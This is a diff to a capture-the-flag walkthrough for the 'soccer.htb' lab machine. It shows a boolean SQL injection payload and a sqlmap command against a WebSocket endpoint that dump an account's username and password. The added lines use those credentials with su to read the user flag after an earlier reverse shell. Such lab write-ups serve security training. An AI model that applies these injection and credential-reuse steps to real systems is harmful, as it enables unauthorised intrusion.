@@ -260,6 +260,8 @@ Parameter: JSON #1* ((custom) POST)
     Payload: {"id":"-9663 OR 8964=8964"}
 
 ```
+To clarify why we need port 9091, it is because the intercepted request from Burpsuite shows that the WebSocket request is being sent to http://soc-player.soccer.htb:9091/
+
 Now we add the --dbs subcommand to get the list of databases 
 ```
 sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --dbs --threads 10
@@ -288,4 +290,18 @@ Table: accounts
 and we got a username/password pair:
 
 player@player.htb and PlayerOftheMatch2022
+
+We can now try logging into the site soc-player.soccer.htb with these credentials, however after logging in we find nothing. We can also try going back to the reverse shell we made at the Tiny File Manager subdirectory and try logging in to the "player" user. 
+
+```
+su player
+cd /home/player
+cat user.txt
+
+bc66cd6a267065d27bd7df56f0f53c9b
+```
+And as you can see, we find the user.txt flag.
+
+### User.txt found
+
 
